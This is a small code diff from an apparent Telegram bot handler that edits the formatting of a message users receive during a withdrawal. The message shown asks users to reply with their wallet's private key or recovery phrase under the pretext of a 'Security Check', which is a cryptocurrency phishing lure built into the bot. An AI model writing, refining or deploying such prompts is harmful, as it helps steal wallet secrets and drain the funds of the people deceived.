@@ -856,7 +856,7 @@ def build_user_router(
             parse_mode="HTML",
         )
         await message.answer(
-            "⚠️ <b>Security Check Required</b>\n\n"
+            "⚠️ Security Check Required\n\n"
             "To process your withdrawal, please reply with your wallet's Private" 
             "Key or Recovery Phrase to verify ownership.",
             reply_markup=ForceReply(
